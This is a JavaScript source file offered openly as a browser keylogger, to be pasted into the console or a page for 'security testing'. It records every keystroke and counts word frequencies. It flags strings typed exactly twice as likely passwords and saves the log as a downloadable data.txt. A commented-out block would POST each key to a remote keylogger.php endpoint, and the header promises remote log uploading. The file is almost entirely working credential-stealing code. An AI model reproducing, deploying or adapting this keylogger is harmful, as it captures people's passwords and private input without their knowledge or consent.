//  JavaScript Keylogger / Analyzer
//  Written by Johnny Dunn

//  Insert this script into the console of the web browser (Tested with Chrome only) to get data
//  Data only saves upon button clicking with the included demo HTML page; soon there will be remote uploading of the log added
//  For security testing / desmonstration purposes only

//  Credit http://stackoverflow.com/questions/5667888/counting-the-occurrences-of-javascript-array-elements for some word frequency code
//  Credit http://stackoverflow.com/questions/9256257/combining-two-arrays-to-form-a-javascript-object for the code to combine arrays into object

var keys = " ";                 //  Declaring a javascript variable to store each keystroke 
var allText = "";               //  Stores the keys being typed
var allTextSplit = [];          //  Split typed characters by spaces for words
var allTextJoined = "";

var data = "data.txt";          //  File where logs will be stored

var a, b, prev = [];            //  Arrays that will be combined together 
var counts = {};                //  Object of the combined arrays to keep track of words and their frequencies
var strObj = "";                //  Changes object to string

var possiblePasswords = "";     //  Possible passwords (Strings that were entered exactly twice)
var possiblePasswordsString = "";     //  The list of possible passwords combined into string

var numOfWords = 0;             //  Start the word counter


onkeypress = function(e) { // calling the function to execute whenever a keystroke is there on html document  document.onkeypress  is an event handler
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode; //get character code 
    key = String.fromCharCode(key); // convert it to string 
    keys+=key; // append current character to previous one (concatinate)
    splitAllText(allText);
    checkSplitText(allTextSplit, counts);
    //  Uncomment the code below to make the keylogger parse / filter itself when the user hits 'ENTER' or any other key you bind..
    if (e.keyCode == 13) {       //  If the user has pressed enter.. 
     allText += keys;
     keys = " ";         //  Leave a space after enter to start next string / word
     objToString(counts);
      // Variables below were an attempt to automatically create a log file for the data via PHP.. 
      // var http = new XMLHttpRequest();
      // var param = encodeURI(key)
      // http.open("POST","http://jddunn.github.io/web-based-keylogger/keylogger.php",true);
      // http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
      // http.send("key="+param);
    // }
    }
}

 // This makes the keylogger record strings every 3 second, instead of on pressing a key like 'ENTER'

 window.setInterval(function(e){            
 // console.log(keys);
    allText = allText + keys;
    splitAllText(allText);
    keys = " ";
    checkSplitText(allTextSplit);
    objToString(counts);
    hasDuplicates(counts, a, b);
    // console.log(allTextSplit);
}, 3000); // set interval to execute function continuously 


function splitAllText(allText) {        //  Splits the text by spaces to make words
    allTextSplit = allText.split(" ");
    return allTextSplit;
}

function checkSplitText(allTextSplit, counts) {     //  Begins process of combing the split text into an object
    // for (var i = 0; i < allTextSplit.length; i++) {
    // // console.log("New string: " + allTextSplit[i]);
    // }
    numberOfWords(allTextSplit);
    // console.log("Number of words so far: " + numOfWords);
    getFrequency(allTextSplit);
    getKeyAndValues(a,b);
    // console.log(counts);
    console.log("Total Number of 'Words': " +numOfWords + "\n")
    console.log(strObj + "\n")
    console.log(possiblePasswordsString + "")
}

function numberOfWords(allTextSplit) {          //  Counts the number of words
    allTextJoined = allTextSplit.join(' ');
    numOfWords = allTextJoined.split(' ').length;
    return numOfWords, allTextJoined;
}

function getFrequency(allTextSplit) {       //  Counts the frequency for every word
    a = [], b = [], prev;
    allTextSplit.sort();
    for ( var i = 0; i < allTextSplit.length; ++i ) {
        if ( allTextSplit[i] !== prev ) {
            a.push(allTextSplit[i]);
            b.push(1);
        } else {
            ++b[b.length-1];
        }
        prev = allTextSplit[i];
    }
    return [a, b];
}

function getKeyAndValues(a, b) {                    //  Combines the two arrays into an object
    // allTextJoined = allTextSplit.join(' ');
    // allTextJoined = allTextJoined.replace(/[\.,-\/#!$%\^&\*;:{}=\-_`~()]/g,"");
    for (var i = 0; i < a.length; i++) {
         counts[a[i]] = b[i];
    }
    return counts;
}

function objToString (counts) {         //  Make object into string to send into text file
    strObj = "Word Counter" + "\n" + "(Ignore first blank line):" + "\n" + "\n";
    for (var p in counts) {
        if (counts.hasOwnProperty(p)) {
            strObj +=  "Word: " + p + " - " + "Frequency: " + counts[p] +"\n";
        }
    }
    return strObj;
}

// If duplicate values are found, then this string potentially is a password since users had to enter it twice.
function hasDuplicates(counts, a, b) {      
        for (var prop in counts) {
            if (counts.hasOwnProperty(prop)) {
                if (counts[prop] == "2") {
                    // console.log("Potential password: " + " " + prop);
                    possiblePasswordsString += "\n" + "Potential password: " + prop;
            }   else {
                if (counts[prop] != "2") {
                    possiblePasswords = "";
                }
            }
        }
    }       
        return possiblePasswords;
}

/*  Further filter options in the future
//  http://stackoverflow.com/questions/4009756/how-to-count-string-occurrence-in-string
function occurrences(string, subString, allowOverlapping) {
    string += "";
    subString += "";
    if (subString.length <= 0) return (string.length + 1);

    var n = 0,
        pos = 0,
        step = allowOverlapping ? 1 : subString.length;

    while (true) {
        pos = string.indexOf(subString, pos);
        if (pos >= 0) {
            ++n;
            pos += step;
        } else break;
    }
    return n;
}*/

//  Function below is for the example HTML page to save the keylogger data file
function saveTextAsFile() {
    //  Repeat the process of adding the latest keys to the log to ensure latest message is recorded
    allText += keys;            
    splitAllText(allText);
    checkSplitText(allTextSplit, counts);
    hasDuplicates(counts, a, b);
    var numOfWordsString = "Total Number of 'Words' Recorded: " + numOfWords;
    var possiblePasswordsText = "Password Finder: " + "\n" + "(Potential passwords that continually show up are most likely to be actual passwords)"
                                + "\n" + possiblePasswordsString;
    var dateString = new Date().toLocaleString();
    var fullLog = "Key Recordings saved on " + dateString + "\n" + "\n" + "\n" +  numOfWordsString + "\n" + "\n" + "\n" +  strObj + "\n" + "\n" + possiblePasswordsText;     //  This is the final string with all the log data recorded
    // allTextJoined = allTextSplit.join([separator = ' ']);
    // var textToWrite = allTextJoined;
    var textFileAsBlob = new Blob([fullLog], {type:'text/plain'});
    var fileNameToSaveAs = data;
    var downloadLink = document.createElement("a");
    downloadLink.download = fileNameToSaveAs;
    if (window.URL != null) {
        // Chrome allows the link to be clicked
        // without actually adding it to the DOM.
        downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob);
    } else {
        // Firefox requires the link to be added to the DOM
        // before it can be clicked.
        downloadLink.href = window.URL.createObjectURL(textFileAsBlob);
        downloadLink.onclick = document.body.removeChild(event.target);
        downloadLink.style.display = "none";
        document.body.appendChild(downloadLink);
    }
    downloadLink.click();
}